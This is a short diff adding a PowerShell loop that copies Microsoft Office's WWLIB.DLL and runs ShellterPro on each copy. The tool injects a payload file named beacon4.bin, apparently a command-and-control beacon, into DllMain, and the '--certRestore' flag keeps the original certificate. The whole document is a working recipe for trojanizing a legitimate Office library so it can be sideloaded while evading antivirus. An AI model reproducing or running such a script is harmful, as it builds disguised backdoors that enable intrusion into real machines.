@@ -1,0 +1,7 @@
+$file = "WWLIB.DLL"
+For ($i=0; $i -le 10; $i++) {
+copy $file .\dlls\$i.DLL
+.\ShellterPro.exe -f C:\Tools\ShellterPro_v3.5\dlls\$i.DLL -s -a -p C:\Tools\ShellterPro_v3.5\dlls\beacon4.bin --ExpFunc DllMain --certRestore 
+}
+
+From C:\Program Files (x86)\Microsoft Office\root\Office16\WWLIB.DLL
